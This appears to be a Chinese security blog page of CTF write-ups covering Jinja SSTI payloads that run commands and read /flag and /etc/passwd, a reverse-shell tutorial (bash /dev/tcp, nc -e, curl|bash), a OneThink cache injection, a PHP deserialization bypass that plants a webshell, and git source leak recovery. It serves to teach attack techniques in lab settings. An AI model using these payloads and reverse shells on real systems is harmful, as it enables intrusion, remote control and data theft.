<p>这里只不过 <code>builtins</code> 代替的 <code>__builtin__</code></p>
<p>在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 <code>dir(__builtins__)</code> 可以查到。</p>
<p><img src="/images/40.png"></p>
</li>
</ul>
<h3 id="查询都哪些子类调用了-builtins-每个版本的python，子类不一样"><a href="#查询都哪些子类调用了-builtins-每个版本的python，子类不一样" class="headerlink" title="查询都哪些子类调用了__builtins__(每个版本的python，子类不一样)"></a>查询都哪些子类调用了<code>__builtins__</code>(每个版本的python，子类不一样)</h3><pre class=" language-python"><code class="language-python">search <span class="token operator">=</span> <span class="token string">'__builtins__'</span>   
num <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    num <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> search <span class="token keyword">in</span> i<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> num<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span></code></pre>
<p>在SSTI中，我们要做的无非就两个：</p>
<ul>
<li>执行命令</li>
<li>获取文件内容</li>
</ul>
<h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>直接回车搜索出现参数name</p>
<p><img src="/images/34.png"></p>
<p>输入1，回显出1。猜测是模板注入。</p>
<pre><code>payload=&#123;&#123;6*6&#125;&#125;   回显36，存在模板注入。</code></pre>
<p><img src="/images/35.png"></p>
<p>注入思路，虽然当前的类底下可能没有可以执行命令的方法，但可以找到它的基类下的其他子类，进行命令执行。</p>
<pre><code>payload=&#123;&#123;''.__class__&#125;&#125;</code></pre>
<p>回显对象所对应的类，这里是字符型。当然前面的‘’可以换成其他的，像（），[]等。</p>
<p><img src="/images/36.png"></p>
<p>下一步找到类所对应的基类object</p>
<pre><code>payload=&#123;&#123;''.__class__.__mro__&#125;&#125;  注：除了mro 还可以使用base 和 bases</code></pre>
<p><img src="/images/37.png"></p>
<p>下一步找到其底下的所有子类</p>
<pre><code>payload=&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;</code></pre>
<p><img src="/images/38.png"></p>
<p>接下来就是找能执行命令或者可以读取文件的类就可以了，重点关注os/file这些关键字。例如file类和os._wrap_close类</p>
<pre><code>payload=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()&#125;&#125;</code></pre>
<p><img src="/images/39.png"></p>
<p>最后cat下就行</p>
<pre><code>payload=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code></pre>
<h3 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h3><p>#threading.Semaphore</p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()&#125;&#125;</code></pre>
<p>#os._wrap_close</p>
<pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code></pre>
<p>#warnings.catch_warnings</p>
<pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<p>#file</p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/tmp/..','w').write()&#125;&#125;</code></pre>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885#toc-1">https://xz.aliyun.com/t/6885#toc-1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226900">https://www.anquanke.com/post/id/226900</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/TM_1024/article/details/107237455?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161614309216780265430236%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161614309216780265430236&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107237455.pc_search_result_before_js&amp;utm_term=BJDCTF+2nd%5Dfake+google">https://blog.csdn.net/TM_1024/article/details/107237455?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161614309216780265430236%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161614309216780265430236&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107237455.pc_search_result_before_js&amp;utm_term=BJDCTF+2nd%5Dfake+google</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/18/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%81%9A%E9%A2%98%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BC%B9shell/">
                从一次做题浅析反弹shell
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h4 id="什么是shell，什么是反弹shell，为何要反弹shell"><a href="#什么是shell，什么是反弹shell，为何要反弹shell" class="headerlink" title="#什么是shell，什么是反弹shell，为何要反弹shell"></a>#什么是shell，什么是反弹shell，为何要反弹shell</h4><p>Shell 俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。简单说用户通过壳（shell）访问操作系统内核的服务，也就是由壳到内核，执行系统命令。shell是渗透中常用的名词，像getshell，webshell，反弹shell等等，都和shell相关。</p>
<ul>
<li>getshell：获取到目标的命令执行权限</li>
<li>webshell：指网站后门，通过web服务进行命令执行</li>
<li>反弹shell：把命令行的输入输出转移到其它主机</li>
</ul>
<p>反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p>
<p>那么什么情况下正向连接不太好用了呢？<br>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。<br>2.由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br>3.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<h3 id="常见的linux反弹shell的方法"><a href="#常见的linux反弹shell的方法" class="headerlink" title="常见的linux反弹shell的方法"></a>常见的linux反弹shell的方法</h3><p>nc又称netcat（瑞士军刀）</p>
<ol>
<li>实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</li>
<li>端口扫描，nc可以作为client发起TCP或UDP连接</li>
<li>机器之间传输文件</li>
<li>机器之间网络测速</li>
</ol>
<p>nc的安装 </p>
<pre><code>yum install -y nc</code></pre>
<p>监听端口（攻击机）</p>
<pre><code>nc -lvvp 4455  -l监听模式，用于入站连接 -p本地端口号 -v输出交互或出错信息,显示指令执行过程</code></pre>
<h5 id="方法一：主动连接（被攻击机）"><a href="#方法一：主动连接（被攻击机）" class="headerlink" title="方法一：主动连接（被攻击机）"></a>方法一：主动连接（被攻击机）</h5><pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre>
<p>bash -i 建立一个交互式的bash</p>
<p>/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps</p>
<p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</p>
<p>远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</p>
<p>#linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：<br>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;<br>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;<br>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</p>
<p>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 </p>
<p>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</p>
<p>完整解读：</p>
<p>bash产生了一个交互环境与本地主机主动发起与目标主机4455端口建立的连接（即TCP 4455 会话连接）相结合，然后在重定向个tcp 4455会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出。（简单来说就是，可以在攻击机上输入指令并接收结果，不会被被攻击者发现。</p>
<h5 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5><p>被攻击机</p>
<pre><code>nc ip -e /bin/sh</code></pre>
<h5 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h5><p>被攻击机</p>
<pre><code>curl http://ip/1.txt|bash</code></pre>
<p>注：需要先在目标内网的一台服务器下写上反弹连接一句话才可以使用</p>
<pre><code>cd /var/www/html

echo &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot; &gt; 1.txt</code></pre>
<h4 id="CTF题目-BJDCTF-2nd-duangShell练习"><a href="#CTF题目-BJDCTF-2nd-duangShell练习" class="headerlink" title="CTF题目[BJDCTF 2nd]duangShell练习"></a>CTF题目[BJDCTF 2nd]duangShell练习</h4><p>知识：反弹shell，swp泄露</p>
<p>当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。<br>意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。<br>例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。</p>
<p>访问url/.index.php.swp下载文件（记住index前面有个点）</p>
<p>放到kali上用vim恢复文件</p>
<pre><code>vim -r index.php.swp</code></pre>
<p><img src="/images/32.png"></p>
<p>过滤了很多关键的东西，而且exec执行命令不会回显。需要反弹shell，这里需要自己的vps。用buu利用的不行。</p>
<p>用xshell或者kali连接上自己的服务器。</p>
<pre><code>ssh -p 22 用户名@ip（公网ip）
nc -lvvp 4455</code></pre>
<p>POST数据：</p>
<pre><code>girl_friend=nc ip(自己服务器的公网ip) -e /bin/sh 或者 nc ip -e /bin/bash</code></pre>
<p><img src="/images/33.png"></p>
<p>连接成功</p>
<pre><code>find / -name flag
cat /etc/.../flag</code></pre>
<p>获得flag</p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/111740527?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161605742116780265461649%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161605742116780265461649&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-111740527.first_rank_v2_pc_rank_v29&amp;utm_term=%E4%B8%BA%E4%BD%95%E8%A6%81%E5%8F%8D%E5%BC%B9shell">https://blog.csdn.net/weixin_44288604/article/details/111740527?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161605742116780265461649%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161605742116780265461649&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-111740527.first_rank_v2_pc_rank_v29&amp;utm_term=%E4%B8%BA%E4%BD%95%E8%A6%81%E5%8F%8D%E5%BC%B9shell</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/111740527?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161605742116780265461649%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161605742116780265461649&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-111740527.first_rank_v2_pc_rank_v29&amp;utm_term=%E4%B8%BA%E4%BD%95%E8%A6%81%E5%8F%8D%E5%BC%B9shell">https://blog.csdn.net/weixin_44288604/article/details/111740527?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161605742116780265461649%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161605742116780265461649&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-111740527.first_rank_v2_pc_rank_v29&amp;utm_term=%E4%B8%BA%E4%BD%95%E8%A6%81%E5%8F%8D%E5%BC%B9shell</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41107295/article/details/113245878?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161606136716780262556128%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161606136716780262556128&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113245878.first_rank_v2_pc_rank_v29&amp;utm_term=linux%E5%8F%8D%E5%BC%B9shell">https://blog.csdn.net/qq_41107295/article/details/113245878?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161606136716780262556128%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161606136716780262556128&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113245878.first_rank_v2_pc_rank_v29&amp;utm_term=linux%E5%8F%8D%E5%BC%B9shell</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105351352?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161606213116780357231217%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161606213116780357231217&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-105351352.first_rank_v2_pc_rank_v29&amp;utm_term=%5BBJDCTF+2nd%5DduangShell">https://blog.csdn.net/qq_45521281/article/details/105351352?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161606213116780357231217%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161606213116780357231217&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-105351352.first_rank_v2_pc_rank_v29&amp;utm_term=%5BBJDCTF+2nd%5DduangShell</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/15/OneThink1-0%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/">
                OneThink1.0文件缓存漏洞
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-15</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h4 id="打开首页显示就是OneThink1-0的CMS百度发现存在文件缓存漏洞"><a href="#打开首页显示就是OneThink1-0的CMS百度发现存在文件缓存漏洞" class="headerlink" title="打开首页显示就是OneThink1.0的CMS百度发现存在文件缓存漏洞"></a>打开首页显示就是OneThink1.0的CMS百度发现存在文件缓存漏洞</h4><p>先注册一个用户，户名名为%0aphpinfo();#</p>
<p>用burp拦截，对%0a进行url解码使之换行，就可以放行。</p>
<p><img src="D:\boke\blog\source\images\31.png"></p>
<p>然后进行登录，登录的时候也要对%0a进行解码。</p>
<p>最后登录上去的是phpinfo();#</p>
<p>访问指定路径,发现phpinfo()被解析了。</p>
<pre><code>url/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php</code></pre>
<p>接下来分别注册用户名为</p>
<p>%0a$a=($_GET[‘a’]);#</p>
<p>%0asystem($a);#</p>
<p>访问寻找flag.php的位置，再cat读取。</p>
<pre><code>/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=ls ../../</code></pre>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/14/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9B%E5%8D%81%E6%9C%88%E5%9C%BAhash-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
                百度杯CTF比赛十月场hash-反序列化漏洞
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-14</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>前面拿$sign直接放进md5网站就可以解密出为kkkkkk01，随机写一个不是123的进行加密就行，同时修改key的值。</p>
<h4 id="序列化对象"><a href="#序列化对象" class="headerlink" title="序列化对象"></a>序列化对象</h4><p><img src="/images/30.png"></p>
<h4 id="Gu3ss-m3-h2h2-php分析"><a href="#Gu3ss-m3-h2h2-php分析" class="headerlink" title="Gu3ss_m3_h2h2.php分析"></a>Gu3ss_m3_h2h2.php分析</h4><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'Gu3ss_m3_h2h2.php'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//类的析构函数,在对象被销毁时执行该函数&amp;#123;</span>
        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//执行unserialize()时，先会调用这个函数 &amp;#123;                               </span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string">'Gu3ss_m3_h2h2.php'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token comment" spellcheck="true">//the secret is in the f15g_1s_here.php</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">'Gu3ss_m3_h2h2.php'</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//\d表示[0-9],匹配o或者c+:+数字+:不区分大小写 &amp;#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>

        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//serialize()函数和unserialize()函数实例化完对象后，都会对对象进行销毁，触发__destruct()</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"Gu3ss_m3_h2h2.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token delimiter">?></span> </code></pre>
<h4 id="php魔法函数"><a href="#php魔法函数" class="headerlink" title="php魔法函数"></a>php魔法函数</h4><pre><code>__construct()    #类的构造函数
__destruct()    #类的析构函数,在对象被销毁时执行该函数
__call()    #在对象中调用一个不可访问方法时调用
__callStatic()    #用静态方式中调用一个不可访问方法时调用
__get()    #获得一个类的成员变量时调用
__set()    #设置一个类的成员变量时调用
__isset()    #当对不可访问属性调用isset()或empty()时调用
__unset()    #当对不可访问属性调用unset()时被调用。
__sleep()    #执行serialize()时，先会调用这个函数
__wakeup()    #执行unserialize()时，先会调用这个函数
__toString()    #类被当成字符串时的回应方法
__invoke()    #调用函数的方式调用一个对象时的回应方法
__set_state()    #调用var_export()导出类时，此静态方法会被调用。
__clone()    #当对象复制完成时调用
__autoload()    #尝试加载未定义的类
__debugInfo()    #打印所需调试信息</code></pre>
<h4 id="绕过正则和-wakeup"><a href="#绕过正则和-wakeup" class="headerlink" title="绕过正则和__wakeup()"></a>绕过正则和__wakeup()</h4><p>3 变成 +3 就可绕过正则；</p>
<p>将数据的属性值改成大于真实值即可绕过。</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string">'f15g_1s_here.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'O:4'</span><span class="token punctuation">,</span><span class="token string">'O:+4'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//绕过正则</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">':1:'</span><span class="token punctuation">,</span><span class="token string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//绕过__wakeup()</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></code></pre>
<h4 id="f15g-1s-here-php分析"><a href="#f15g-1s-here-php分析" class="headerlink" title="f15g_1s_here.php分析"></a>f15g_1s_here.php分析</h4><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'$value="'</span> <span class="token punctuation">.</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'";'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hahaha!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token delimiter">?></span> </code></pre>
<p>没过滤，只用了addslashes()过滤了，‘，’‘，,NULL。</p>
<p>payload: val=${eval($_POST[1])}</p>
<h4 id="连接蚁剑得到真的flag文件，找到flag"><a href="#连接蚁剑得到真的flag文件，找到flag" class="headerlink" title="连接蚁剑得到真的flag文件，找到flag"></a>连接蚁剑得到真的flag文件，找到flag</h4><p>笔记:</p>
<pre><code>payload:(适用于destruct() wakeup())
O:4:&quot;demo&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;age&quot;;s:9:&quot;phpinfo()&quot;;&#125;

传木马
O:4:&quot;demo&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;age&quot;;s:64:&quot;fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[&quot;cmd&quot;]);?&gt;&#39;);&quot;;&#125;</code></pre>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/11/i%E6%98%A5%E7%A7%8B-Hello-World-git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/">
                i春秋-Hello World-git文件泄露
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-11</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>f12发现有flag.xmas.js,访问404。再看cookie，解码发现是admin的rot13。然后没啥思路，看了wp，考的是敏感文件.git的泄露。</p>
<h4 id="git泄露原因"><a href="#git泄露原因" class="headerlink" title="git泄露原因"></a>git泄露原因</h4><p>.git文件是开发人员在开发过程中使用Git做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。在运行git init 初始化代码库时，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等。在发布代码的时候，没有把.git这个目录删除，导致可以使用这个文件来恢复源代码。</p>
<h4 id="先用dirmap扫描网站"><a href="#先用dirmap扫描网站" class="headerlink" title="先用dirmap扫描网站"></a>先用dirmap扫描网站</h4><pre><code>cd dirmap
python dirmap.py -i http://106.75.72.168:9999/ -lcf</code></pre>
<p>结果：</p>
<pre><code>[200][None][130.00b] http://106.75.72.168:9999/.git/config                        [200][None][650.00b] http://106.75.72.168:9999/.git/logs/HEAD                    [200][None][153.00b] http://106.75.72.168:9999/.git/logs/refs/heads/master        [200][None][41.00b] http://106.75.72.168:9999/.git/refs/heads/master              [200][None][73.00b] http://106.75.72.168:9999/.git/description                    [200][None][240.00b] http://106.75.72.168:9999/.git/info/exclude                  [200][None][33.00b] http://106.75.72.168:9999/.git/COMMIT_EDITMSG                [200][None][281.00b] http://106.75.72.168:9999/.git/index                        [200][None][23.00b] http://106.75.72.168:9999/.git/HEAD                          [200][text/html][100.00b] http://106.75.72.168:9999/index.php
[200][text/html][100.00b] http://106.75.72.168:9999/index.php/login/</code></pre>
<p>看到.git应该存在源码泄露。</p>
<h4 id="然后用Git-Extract跑一下"><a href="#然后用Git-Extract跑一下" class="headerlink" title="然后用Git_Extract跑一下"></a>然后用Git_Extract跑一下</h4><pre><code>cd Git_Extract

python git_extract.py &quot;http://106.75.72.168:9999/.git/&quot;</code></pre>
<p>结果</p>
<p><img src="/images/28.png"></p>
<p>打开这两个文件发现很相近，用diff命令比较下</p>
<pre><code>diff flag.js flag.js.04bb09</code></pre>
<p><img src="/images/29.png"></p>
<p>拼出来就是flag{}</p>
<p>注：用GitHack扫不出flag.js.04bb09这个文件</p>
<p>下载dirmap时需要先装下python3 的 pip</p>

        </div>
    

</div>
            
                
<div class="post">

